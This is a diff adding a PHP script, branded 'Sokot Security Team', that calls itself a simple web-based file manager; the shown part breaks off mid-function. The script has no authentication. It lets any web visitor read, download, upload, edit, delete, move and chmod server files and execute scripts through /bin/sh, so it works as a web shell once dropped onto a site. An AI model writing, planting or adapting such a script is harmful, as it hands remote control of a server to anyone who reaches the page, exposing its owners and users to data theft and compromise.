@@ -1,0 +1,2491 @@
+   1 <?php
+   2 /*
+   3  * Sokot Security Team - a simple Web-based file manager
+   4  * Copyright (C) 2004  Sokot Security Team <>
+   5  *
+   6  * This program is free software; you can redistribute it and/or modify
+   7  * it under the terms of the GNU General Public License as published by
+   8  * the Free Software Foundation; either version 2 of the License, or
+   9  * (at your option) any later version.
+  10  *
+  11  * This program is distributed in the hope that it will be useful,
+  12  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  13  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  14  * GNU General Public License for more details.
+  15  *
+  16  * You should have received a copy of the GNU General Public License
+  17  * along with this program; if not, write to the Free Software
+  18  * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
+  19  *
+  20  * -------------------------------------------------------------------------
+  21  * While using this script, do NOT navigate with your browser's back and
+  22  * forward buttons! Always open files in a new browser tab!
+  23  * -------------------------------------------------------------------------
+  24  *
+  25  * This is Version 0.9, revision 9
+  26  * =========================================================================
+  27  *
+  28  * Changes of revision 9
+  29  * <>
+  30  *    added workaround for directory listing, if lstat() is disabled
+  31  *    fixed permisson of uploaded files (thanks to Stephan Duffner)
+  32  *
+  33  * Changes of revision 8
+  34  * <okankan@stud.sdu.edu.tr>
+  35  *    added Turkish translation
+  36  * <j@kub.cz>
+  37  *    added Czech translation
+  38  * <>
+  39  *    improved charset handling
+  40  *
+  41  * Changes of revision 7
+  42  * <szuniga@vtr.net>
+  43  *    added Spanish translation
+  44  * <lars@soelgaard.net>
+  45  *    added Danish translation
+  46  * <>
+  47  *    improved rename dialog
+  48  *
+  49  * Changes of revision 6
+  50  * <nederkoorn@tiscali.nl>
+  51  *    added Dutch translation
+  52  *
+  53  * Changes of revision 5
+  54  * <>
+  55  *    added language auto select
+  56  *    fixed symlinks in directory listing
+  57  *    removed word-wrap in edit textarea
+  58  *
+  59  * Changes of revision 4
+  60  * <daloan@guideo.fr>
+  61  *    added French translation
+  62  * <anders@wiik.cc>
+  63  *    added Swedish translation
+  64  *
+  65  * Changes of revision 3
+  66  * <nzunta@gabriele-erba.it>
+  67  *    improved Italian translation
+  68  *
+  69  * Changes of revision 2
+  70  * <>
+  71  *    got images work in some old browsers
+  72  *    fixed creation of directories
+  73  *    fixed files deletion
+  74  *    improved path handling
+  75  *    added missing word 'not_created'
+  76  * <till@tuxen.de>
+  77  *    improved human readability of file sizes
+  78  * <nzunta@gabriele-erba.it>
+  79  *    added Italian translation
+  80  *
+  81  * Changes of revision 1
+  82  * <>
+  83  *    Sokot Security Team completely rewritten:
+  84  *    - clean XHTML/CSS output
+  85  *    - several files selectable
+  86  *    - support for windows servers
+  87  *    - no more treeview, because
+  88  *      - Sokot Security Team is a >simple< file manager
+  89  *      - performance problems (too much additional code)
+  90  *      - I don't like: frames, java-script, to reload after every treeview-click
+  91  *    - execution of shell scripts
+  92  *    - introduced revision numbers
+  93  *
+  94 /* ------------------------------------------------------------------------- */
+  95 
+  96 /* Your language:
+  97  * 'en' - English
+  98  * 'de' - German
+  99  * 'fr' - French
+ 100  * 'it' - Italian
+ 101  * 'nl' - Dutch
+ 102  * 'se' - Swedish
+ 103  * 'sp' - Spanish
+ 104  * 'dk' - Danish
+ 105  * 'tr' - Turkish
+ 106  * 'cs' - Czech
+ 107  * 'auto' - autoselect
+ 108  */
+ 109 $lang = 'auto';
+ 110 
+ 111 /* Charset of output:
+ 112  * possible values are described in the charset table at
+ 113  * http://www.php.net/manual/en/function.htmlentities.php
+ 114  * 'auto' - use the same charset as the words of my language are encoded
+ 115  */
+ 116 $site_charset = 'auto';
+ 117 
+ 118 /* Homedir:
+ 119  * For example: './' - the script's directory
+ 120  */
+ 121 $homedir = './';
+ 122 
+ 123 /* Size of the edit textarea
+ 124  */
+ 125 $editcols = 80;
+ 126 $editrows = 25;
+ 127 
+ 128 /* -------------------------------------------
+ 129  * Optional configuration (remove # to enable)
+ 130  */
+ 131 
+ 132 /* Permission of created directories:
+ 133  * For example: 0705 would be 'drwx---r-x'.
+ 134  */
+ 135 # $dirpermission = 0705;
+ 136 
+ 137 /* Permission of created files:
+ 138  * For example: 0604 would be '-rw----r--'.
+ 139  */
+ 140 # $filepermission = 0604;
+ 141 
+ 142 /* Filenames related to the apache web server:
+ 143  */
+ 144 $htaccess = '.htaccess';
+ 145 $htpasswd = '.htpasswd';
+ 146 
+ 147 /* ------------------------------------------------------------------------- */
+ 148 
+ 149 if (get_magic_quotes_gpc()) {
+ 150    array_walk($_GET, 'strip');
+ 151    array_walk($_POST, 'strip');
+ 152    array_walk($_REQUEST, 'strip');
+ 153 }
+ 154 
+ 155 if (array_key_exists('image', $_GET)) {
+ 156    header('Content-Type: image/gif');
+ 157    die(getimage($_GET['image']));
+ 158 }
+ 159 
+ 160 if (!function_exists('lstat')) {
+ 161    function lstat ($filename) {
+ 162        return stat($filename);
+ 163    }
+ 164 }
+ 165 
+ 166 $delim = DIRECTORY_SEPARATOR;
+ 167 
+ 168 if (function_exists('php_uname')) {
+ 169    $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
+ 170 } else {
+ 171    $win = ($delim == '\\') ? true : false;
+ 172 }
+ 173 
+ 174 if (!empty($_SERVER['PATH_TRANSLATED'])) {
+ 175    $scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
+ 176 } elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
+ 177    $scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
+ 178 } elseif (function_exists('getcwd')) {
+ 179    $scriptdir = getcwd();
+ 180 } else {
+ 181    $scriptdir = '.';
+ 182 }
+ 183 $homedir = relative2absolute($homedir, $scriptdir);
+ 184 
+ 185 $dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;
+ 186 
+ 187 if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
+ 188    $dir = relative2absolute($dir, $_POST['olddir']);
+ 189 }
+ 190 
+ 191 $directory = simplify_path(addslash($dir));
+ 192 
+ 193 $files = array();
+ 194 $action = '';
+ 195 if (!empty($_POST['submit_all'])) {
+ 196    $action = $_POST['action_all'];
+ 197    for ($i = 0; $i < $_POST['num']; $i++) {
+ 198        if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
+ 199            $files[] = $_POST["file$i"];
+ 200        }
+ 201    }
+ 202 } elseif (!empty($_REQUEST['action'])) {
+ 203    $action = $_REQUEST['action'];
+ 204    $files[] = relative2absolute($_REQUEST['file'], $directory);
+ 205 } elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
+ 206    $files[] = $_FILES['upload'];
+ 207    $action = 'upload';
+ 208 } elseif (array_key_exists('num', $_POST)) {
+ 209    for ($i = 0; $i < $_POST['num']; $i++) {
+ 210        if (array_key_exists("submit$i", $_POST)) break;
+ 211    }
+ 212    if ($i < $_POST['num']) {
+ 213        $action = $_POST["action$i"];
+ 214        $files[] = $_POST["file$i"];
+ 215    }
+ 216 }
+ 217 if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
+ 218    $files[] = relative2absolute($_POST['create_name'], $directory);
+ 219    switch ($_POST['create_type']) {
+ 220    case 'directory':
+ 221        $action = 'create_directory';
+ 222        break;
+ 223    case 'file':
+ 224        $action = 'create_file';
+ 225    }
+ 226 }
+ 227 if (sizeof($files) == 0) $action = ''; else $file = reset($files);
+ 228 
+ 229 if ($lang == 'auto') {
+ 230    if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {
+ 231        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+ 232    } else {
+ 233        $lang = 'en';
+ 234    }
+ 235 }
+ 236 
+ 237 $words = getwords($lang);
+ 238 
+ 239 if ($site_charset == 'auto') {
+ 240    $site_charset = $word_charset;
+ 241 }
+ 242 
+ 243 $cols = ($win) ? 4 : 7;
+ 244 
+ 245 if (!isset($dirpermission)) {
+ 246    $dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
+ 247 }
+ 248 if (!isset($filepermission)) {
+ 249    $filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
+ 250 }
+ 251 
+ 252 if (!empty($_SERVER['SCRIPT_NAME'])) {
+ 253    $self = html(basename($_SERVER['SCRIPT_NAME']));
+ 254 } elseif (!empty($_SERVER['PHP_SELF'])) {
+ 255    $self = html(basename($_SERVER['PHP_SELF']));
+ 256 } else {
+ 257    $self = '';
+ 258 }
+ 259 
+ 260 if (!empty($_SERVER['SERVER_SOFTWARE'])) {
+ 261    if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
+ 262        $apache = true;
+ 263    } else {
+ 264        $apache = false;
+ 265    }
+ 266 } else {
+ 267    $apache = true;
+ 268 }
+ 269 
+ 270 switch ($action) {
+ 271 
+ 272 case 'view':
+ 273 
+ 274    if (is_script($file)) {
+ 275 
+ 276        /* highlight_file is a mess! */
+ 277        ob_start();
+ 278        highlight_file($file);
+ 279        $src = ereg_replace('<font color="([^"]*)">', '<span style="color: \1">', ob_get_contents());
+ 280        $src = str_replace(array('</font>', "\r", "\n"), array('</span>', '', ''), $src);
+ 281        ob_end_clean();
+ 282 
+ 283        html_header();
+ 284        echo '<h2 style="text-align: left; margin-bottom: 0">' . html($file) . '</h2>
+ 285 
+ 286 <hr />
+ 287 
+ 288 <table>
+ 289 <tr>
+ 290 <td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray">
+ 291 <pre style="margin-top: 0"><code>';
+ 292 
+ 293        for ($i = 1; $i <= sizeof(file($file)); $i++) echo "$i\n";
+ 294 
+ 295        echo '</code></pre>
+ 296 </td>
+ 297 <td style="text-align: left; vertical-align: top; padding-left: 3pt">
+ 298 <pre style="margin-top: 0">' . $src . '</pre>
+ 299 </td>
+ 300 </tr>
+ 301 </table>
+ 302 
+ 303 ';
+ 304 
+ 305        html_footer();
+ 306 
+ 307    } else {
+ 308 
+ 309        header('Content-Type: ' . getmimetype($file));
+ 310        header('Content-Disposition: filename=' . basename($file));
+ 311 
+ 312        readfile($file);
+ 313 
+ 314    }
+ 315 
+ 316    break;
+ 317 
+ 318 case 'download':
+ 319 
+ 320    header('Pragma: public');
+ 321    header('Expires: 0');
+ 322    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+ 323    header('Content-Type: ' . getmimetype($file));
+ 324    header('Content-Disposition: attachment; filename=' . basename($file) . ';');
+ 325    header('Content-Length: ' . filesize($file));
+ 326 
+ 327    readfile($file);
+ 328 
+ 329    break;
+ 330 
+ 331 case 'upload':
+ 332 
+ 333    $dest = relative2absolute($file['name'], $directory);
+ 334 
+ 335    if (@file_exists($dest)) {
+ 336        listing_page(error('already_exists', $dest));
+ 337    } elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
+ 338        @chmod($dest, $filepermission);
+ 339        listing_page(notice('uploaded', $file['name']));
+ 340    } else {
+ 341        listing_page(error('not_uploaded', $file['name']));
+ 342    }
+ 343 
+ 344    break;
+ 345 
+ 346 case 'create_directory':
+ 347 
+ 348    if (@file_exists($file)) {
+ 349        listing_page(error('already_exists', $file));
+ 350    } else {
+ 351        $old = @umask(0777 & ~$dirpermission);
+ 352        if (@mkdir($file, $dirpermission)) {
+ 353            listing_page(notice('created', $file));
+ 354        } else {
+ 355            listing_page(error('not_created', $file));
+ 356        }
+ 357        @umask($old);
+ 358    }
+ 359 
+ 360    break;
+ 361 
+ 362 case 'create_file':
+ 363 
+ 364    if (@file_exists($file)) {
+ 365        listing_page(error('already_exists', $file));
+ 366    } else {
+ 367        $old = @umask(0777 & ~$filepermission);
+ 368        if (@touch($file)) {
+ 369            edit($file);
+ 370        } else {
+ 371            listing_page(error('not_created', $file));
+ 372        }
+ 373        @umask($old);
+ 374    }
+ 375 
+ 376    break;
+ 377 
+ 378 case 'execute':
+ 379 
+ 380    chdir(dirname($file));
+ 381 
+ 382    $output = array();
+ 383    $retval = 0;
+ 384    exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);
+ 385 
+ 386    $error = ($retval == 0) ? false : true;
+ 387 
+ 388    if (sizeof($output) == 0) $output = array('<' . $words['no_output'] . '>');
+ 389 
+ 390    if ($error) {
+ 391        listing_page(error('not_executed', $file, implode("\n", $output)));
+ 392    } else {
+ 393        listing_page(notice('executed', $file, implode("\n", $output)));
+ 394    }
+ 395 
+ 396    break;
+ 397 
+ 398 case 'delete':
+ 399 
+ 400    if (!empty($_POST['no'])) {
+ 401        listing_page();
+ 402    } elseif (!empty($_POST['yes'])) {
+ 403 
+ 404        $failure = array();
+ 405        $success = array();
+ 406 
+ 407        foreach ($files as $file) {
+ 408            if (del($file)) {
+ 409                $success[] = $file;
+ 410            } else {
+ 411                $failure[] = $file;
+ 412            }
+ 413        }
+ 414 
+ 415        $message = '';
+ 416        if (sizeof($failure) > 0) {
+ 417            $message = error('not_deleted', implode("\n", $failure));
+ 418        }
+ 419        if (sizeof($success) > 0) {
+ 420            $message .= notice('deleted', implode("\n", $success));
+ 421        }
+ 422 
+ 423        listing_page($message);
+ 424 
+ 425    } else {
+ 426 
+ 427        html_header();
+ 428 
+ 429        echo '<form action="' . $self . '" method="post">
+ 430 <table class="dialog">
+ 431 <tr>
+ 432 <td class="dialog">
+ 433 ';
+ 434 
+ 435        request_dump();
+ 436 
+ 437        echo "\t<b>" . word('really_delete') . '</b>
+ 438   <p>
+ 439 ';
+ 440 
+ 441        foreach ($files as $file) {
+ 442            echo "\t" . html($file) . "<br />\n";
+ 443        }
+ 444 
+ 445        echo '  </p>
+ 446   <hr />
+ 447   <input type="submit" name="no" value="' . word('no') . '" id="red_button" />
+ 448   <input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" />
+ 449 </td>
+ 450 </tr>
+ 451 </table>
+ 452 </form>
+ 453 
+ 454 ';
+ 455 
+ 456        html_footer();
+ 457 
+ 458    }
+ 459 
+ 460    break;
+ 461 
+ 462 case 'rename':
+ 463 
+ 464    if (!empty($_POST['destination'])) {
+ 465 
+ 466        $dest = relative2absolute($_POST['destination'], $directory);
+ 467 
+ 468        if (!@file_exists($dest) && @rename($file, $dest)) {
+ 469            listing_page(notice('renamed', $file, $dest));
+ 470        } else {
+ 471            listing_page(error('not_renamed', $file, $dest));
+ 472        }
+ 473 
+ 474    } else {
+ 475 
+ 476        $name = basename($file);
+ 477 
+ 478        html_header();
+ 479 
+ 480        echo '<form action="' . $self . '" method="post">
+ 481 
+ 482 <table class="dialog">
+ 483 <tr>
+ 484 <td class="dialog">
+ 485   <input type="hidden" name="action" value="rename" />
+ 486   <input type="hidden" name="file" value="' . html($file) . '" />
+ 487   <input type="hidden" name="dir" value="' . html($directory) . '" />
+ 488   <b>' . word('rename_file') . '</b>
+ 489   <p>' . html($file) . '</p>
+ 490   <b>' . substr($file, 0, strlen($file) - strlen($name)) . '</b>
+ 491   <input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" />
+ 492   <hr />
+ 493   <input type="submit" value="' . word('rename') . '" />
+ 494 </td>
+ 495 </tr>
+ 496 </table>
+ 497 
+ 498 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+ 499 
+ 500 </form>
+ 501 
+ 502 ';
+ 503 
+ 504        html_footer();
+ 505 
+ 506    }
+ 507 
+ 508    break;
+ 509 
+ 510 case 'move':
+ 511 
+ 512    if (!empty($_POST['destination'])) {
+ 513 
+ 514        $dest = relative2absolute($_POST['destination'], $directory);
+ 515 
+ 516        $failure = array();
+ 517        $success = array();
+ 518 
+ 519        foreach ($files as $file) {
+ 520            $filename = substr($file, strlen($directory));
+ 521            $d = $dest . $filename;
+ 522            if (!@file_exists($d) && @rename($file, $d)) {
+ 523                $success[] = $file;
+ 524            } else {
+ 525                $failure[] = $file;
+ 526            }
+ 527        }
+ 528 
+ 529        $message = '';
+ 530        if (sizeof($failure) > 0) {
+ 531            $message = error('not_moved', implode("\n", $failure), $dest);
+ 532        }
+ 533        if (sizeof($success) > 0) {
+ 534            $message .= notice('moved', implode("\n", $success), $dest);
+ 535        }
+ 536 
+ 537        listing_page($message);
+ 538 
+ 539    } else {
+ 540 
+ 541        html_header();
+ 542 
+ 543        echo '<form action="' . $self . '" method="post">
+ 544 
+ 545 <table class="dialog">
+ 546 <tr>
+ 547 <td class="dialog">
+ 548 ';
+ 549 
+ 550        request_dump();
+ 551 
+ 552        echo "\t<b>" . word('move_files') . '</b>
+ 553   <p>
+ 554 ';
+ 555 
+ 556        foreach ($files as $file) {
+ 557            echo "\t" . html($file) . "<br />\n";
+ 558        }
+ 559 
+ 560        echo '  </p>
+ 561   <hr />
+ 562   ' . word('destination') . ':
+ 563   <input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
+ 564   <input type="submit" value="' . word('move') . '" />
+ 565 </td>
+ 566 </tr>
+ 567 </table>
+ 568 
+ 569 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+ 570 
+ 571 </form>
+ 572 
+ 573 ';
+ 574 
+ 575        html_footer();
+ 576 
+ 577    }
+ 578 
+ 579    break;
+ 580 
+ 581 case 'copy':
+ 582 
+ 583    if (!empty($_POST['destination'])) {
+ 584 
+ 585        $dest = relative2absolute($_POST['destination'], $directory);
+ 586 
+ 587        if (@is_dir($dest)) {
+ 588 
+ 589            $failure = array();
+ 590            $success = array();
+ 591 
+ 592            foreach ($files as $file) {
+ 593                $filename = substr($file, strlen($directory));
+ 594                $d = addslash($dest) . $filename;
+ 595                if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
+ 596                    $success[] = $file;
+ 597                } else {
+ 598                    $failure[] = $file;
+ 599                }
+ 600            }
+ 601 
+ 602            $message = '';
+ 603            if (sizeof($failure) > 0) {
+ 604                $message = error('not_copied', implode("\n", $failure), $dest);
+ 605            }
+ 606            if (sizeof($success) > 0) {
+ 607                $message .= notice('copied', implode("\n", $success), $dest);
+ 608            }
+ 609 
+ 610            listing_page($message);
+ 611 
+ 612        } else {
+ 613 
+ 614            if (!@file_exists($dest) && @copy($file, $dest)) {
+ 615                listing_page(notice('copied', $file, $dest));
+ 616            } else {
+ 617                listing_page(error('not_copied', $file, $dest));
+ 618            }
+ 619 
+ 620        }
+ 621 
+ 622    } else {
+ 623 
+ 624        html_header();
+ 625 
+ 626        echo '<form action="' . $self . '" method="post">
+ 627 
+ 628 <table class="dialog">
+ 629 <tr>
+ 630 <td class="dialog">
+ 631 ';
+ 632 
+ 633        request_dump();
+ 634 
+ 635        echo "\n<b>" . word('copy_files') . '</b>
+ 636   <p>
+ 637 ';
+ 638 
+ 639        foreach ($files as $file) {
+ 640            echo "\t" . html($file) . "<br />\n";
+ 641        }
+ 642 
+ 643        echo '  </p>
+ 644   <hr />
+ 645   ' . word('destination') . ':
+ 646   <input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
+ 647   <input type="submit" value="' . word('copy') . '" />
+ 648 </td>
+ 649 </tr>
+ 650 </table>
+ 651 
+ 652 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+ 653 
+ 654 </form>
+ 655 
+ 656 ';
+ 657 
+ 658        html_footer();
+ 659 
+ 660    }
+ 661 
+ 662    break;
+ 663 
+ 664 case 'create_symlink':
+ 665 
+ 666    if (!empty($_POST['destination'])) {
+ 667 
+ 668        $dest = relative2absolute($_POST['destination'], $directory);
+ 669 
+ 670        if (substr($dest, -1, 1) == $delim) $dest .= basename($file);
+ 671 
+ 672        if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);
+ 673 
+ 674        if (!@file_exists($dest) && @symlink($file, $dest)) {
+ 675            listing_page(notice('symlinked', $file, $dest));
+ 676        } else {
+ 677            listing_page(error('not_symlinked', $file, $dest));
+ 678        }
+ 679 
+ 680    } else {
+ 681 
+ 682        html_header();
+ 683 
+ 684        echo '<form action="' . $self . '" method="post">
+ 685 
+ 686 <table class="dialog" id="symlink">
+ 687 <tr>
+ 688   <td style="vertical-align: top">' . word('destination') . ': </td>
+ 689   <td>
+ 690       <b>' . html($file) . '</b><br />
+ 691       <input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" />
+ 692       <label for="checkbox_relative">' . word('relative') . '</label>
+ 693       <input type="hidden" name="action" value="create_symlink" />
+ 694       <input type="hidden" name="file" value="' . html($file) . '" />
+ 695       <input type="hidden" name="dir" value="' . html($directory) . '" />
+ 696   </td>
+ 697 </tr>
+ 698 <tr>
+ 699   <td>' . word('symlink') . ': </td>
+ 700   <td>
+ 701       <input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
+ 702       <input type="submit" value="' . word('create_symlink') . '" />
+ 703   </td>
+ 704 </tr>
+ 705 </table>
+ 706 
+ 707 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+ 708 
+ 709 </form>
+ 710 
+ 711 ';
+ 712 
+ 713        html_footer();
+ 714 
+ 715    }
+ 716 
+ 717    break;
+ 718 
+ 719 case 'edit':
+ 720 
+ 721    if (!empty($_POST['save'])) {
+ 722 
+ 723        $content = str_replace("\r\n", "\n", $_POST['content']);
+ 724 
+ 725        if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
+ 726            listing_page(notice('saved', $file));
+ 727        } else {
+ 728            listing_page(error('not_saved', $file));
+ 729        }
+ 730 
+ 731    } else {
+ 732 
+ 733        if (@is_readable($file) && @is_writable($file)) {
+ 734            edit($file);
+ 735        } else {
+ 736            listing_page(error('not_edited', $file));
+ 737        }
+ 738 
+ 739    }
+ 740 
+ 741    break;
+ 742 
+ 743 case 'permission':
+ 744 
+ 745    if (!empty($_POST['set'])) {
+ 746 
+ 747        $mode = 0;
+ 748        if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
+ 749        if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
+ 750        if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;
+ 751 
+ 752        if (@chmod($file, $mode)) {
+ 753            listing_page(notice('permission_set', $file, decoct($mode)));
+ 754        } else {
+ 755            listing_page(error('permission_not_set', $file, decoct($mode)));
+ 756        }
+ 757 
+ 758    } else {
+ 759 
+ 760        html_header();
+ 761 
+ 762        $mode = fileperms($file);
+ 763 
+ 764        echo '<form action="' . $self . '" method="post">
+ 765 
+ 766 <table class="dialog">
+ 767 <tr>
+ 768 <td class="dialog">
+ 769 
+ 770   <p style="margin: 0">' . phrase('permission_for', $file) . '</p>
+ 771 
+ 772   <hr />
+ 773 
+ 774   <table id="permission">
+ 775   <tr>
+ 776       <td></td>
+ 777       <td style="border-right: 1px solid black">' . word('owner') . '</td>
+ 778       <td style="border-right: 1px solid black">' . word('group') . '</td>
+ 779       <td>' . word('other') . '</td>
+ 780   </tr>
+ 781   <tr>
+ 782       <td style="text-align: right">' . word('read') . ':</td>
+ 783       <td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>
+ 784       <td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>
+ 785       <td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>
+ 786   </tr>
+ 787   <tr>
+ 788       <td style="text-align: right">' . word('write') . ':</td>
+ 789       <td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>
+ 790       <td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>
+ 791       <td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>
+ 792   </tr>
+ 793   <tr>
+ 794       <td style="text-align: right">' . word('execute') . ':</td>
+ 795       <td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>
+ 796       <td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>
+ 797       <td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>
+ 798   </tr>
+ 799   </table>
+ 800 
+ 801   <hr />
+ 802 
+ 803   <input type="submit" name="set" value="' . word('set') . '" />
+ 804 
+ 805   <input type="hidden" name="action" value="permission" />
+ 806   <input type="hidden" name="file" value="' . html($file) . '" />
+ 807   <input type="hidden" name="dir" value="' . html($directory) . '" />
+ 808 
+ 809 </td>
+ 810 </tr>
+ 811 </table>
+ 812 
+ 813 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+ 814 
+ 815 </form>
+ 816 
+ 817 ';
+ 818 
+ 819        html_footer();
+ 820 
+ 821    }
+ 822 
+ 823    break;
+ 824 
+ 825 default:
+ 826 
+ 827    listing_page();
+ 828 
+ 829 }
+ 830 
+ 831 /* ------------------------------------------------------------------------- */
+ 832 
+ 833 function getlist ($directory) {
+ 834    global $delim, $win;
+ 835 
+ 836    if ($d = @opendir($directory)) {
+ 837 
+ 838        while (($filename = @readdir($d)) !== false) {
+ 839 
+ 840            $path = $directory . $filename;
+ 841 
+ 842            if ($stat = @lstat($path)) {
+ 843 
+ 844                $file = array(
+ 845                    'filename'    => $filename,
+ 846                    'path'        => $path,
+ 847                    'is_file'     => @is_file($path),
+ 848                    'is_dir'      => @is_dir($path),
+ 849                    'is_link'     => @is_link($path),
+ 850                    'is_readable' => @is_readable($path),
+ 851                    'is_writable' => @is_writable($path),
+ 852                    'size'        => $stat['size'],
+ 853                    'permission'  => $stat['mode'],
+ 854                    'owner'       => $stat['uid'],
+ 855                    'group'       => $stat['gid'],
+ 856                    'mtime'       => @filemtime($path),
+ 857                    'atime'       => @fileatime($path),
+ 858                    'ctime'       => @filectime($path)
+ 859                );
+ 860 
+ 861                if ($file['is_dir']) {
+ 862                    $file['is_executable'] = @file_exists($path . $delim . '.');
+ 863                } else {
+ 864                    if (!$win) {
+ 865                        $file['is_executable'] = @is_executable($path);
+ 866                    } else {
+ 867                        $file['is_executable'] = true;
+ 868                    }
+ 869                }
+ 870 
+ 871                if ($file['is_link']) $file['target'] = @readlink($path);
+ 872 
+ 873                if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
+ 874                if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));
+ 875 
+ 876                $files[] = $file;
+ 877 
+ 878            }
+ 879 
+ 880        }
+ 881 
+ 882        return $files;
+ 883 
+ 884    } else {
+ 885        return false;
+ 886    }
+ 887 
+ 888 }
+ 889 
+ 890 function sortlist (&$list, $key, $reverse) {
+ 891 
+ 892    quicksort($list, 0, sizeof($list) - 1, $key);
+ 893 
+ 894    if ($reverse) $list = array_reverse($list);
+ 895 
+ 896 }
+ 897 
+ 898 function quicksort (&$array, $first, $last, $key) {
+ 899 
+ 900    if ($first < $last) {
+ 901 
+ 902        $cmp = $array[floor(($first + $last) / 2)][$key];
+ 903 
+ 904        $l = $first;
+ 905        $r = $last;
+ 906 
+ 907        while ($l <= $r) {
+ 908 
+ 909            while ($array[$l][$key] < $cmp) $l++;
+ 910            while ($array[$r][$key] > $cmp) $r--;
+ 911 
+ 912            if ($l <= $r) {
+ 913 
+ 914                $tmp = $array[$l];
+ 915                $array[$l] = $array[$r];
+ 916                $array[$r] = $tmp;
+ 917 
+ 918                $l++;
+ 919                $r--;
+ 920 
+ 921            }
+ 922 
+ 923        }
+ 924 
+ 925        quicksort($array, $first, $r, $key);
+ 926        quicksort($array, $l, $last, $key);
+ 927 
+ 928    }
+ 929 
+ 930 }
+ 931 
+ 932 function permission_octal2string ($mode) {
+ 933 
+ 934    if (($mode & 0xC000) === 0xC000) {
+ 935        $type = 's';
+ 936    } elseif (($mode & 0xA000) === 0xA000) {
+ 937        $type = 'l';
+ 938    } elseif (($mode & 0x8000) === 0x8000) {
+ 939        $type = '-';
+ 940    } elseif (($mode & 0x6000) === 0x6000) {
+ 941        $type = 'b';
+ 942    } elseif (($mode & 0x4000) === 0x4000) {
+ 943        $type = 'd';
+ 944    } elseif (($mode & 0x2000) === 0x2000) {
+ 945        $type = 'c';
+ 946    } elseif (($mode & 0x1000) === 0x1000) {
+ 947        $type = 'p';
+ 948    } else {
+ 949        $type = '?';
+ 950    }
+ 951 
+ 952    $owner  = ($mode & 00400) ? 'r' : '-';
+ 953    $owner .= ($mode & 00200) ? 'w' : '-';
+ 954    if ($mode & 0x800) {
+ 955        $owner .= ($mode & 00100) ? 's' : 'S';
+ 956    } else {
+ 957        $owner .= ($mode & 00100) ? 'x' : '-';
+ 958    }
+ 959 
+ 960    $group  = ($mode & 00040) ? 'r' : '-';
+ 961    $group .= ($mode & 00020) ? 'w' : '-';
+ 962    if ($mode & 0x400) {
+ 963        $group .= ($mode & 00010) ? 's' : 'S';
+ 964    } else {
+ 965        $group .= ($mode & 00010) ? 'x' : '-';
+ 966    }
+ 967 
+ 968    $other  = ($mode & 00004) ? 'r' : '-';
+ 969    $other .= ($mode & 00002) ? 'w' : '-';
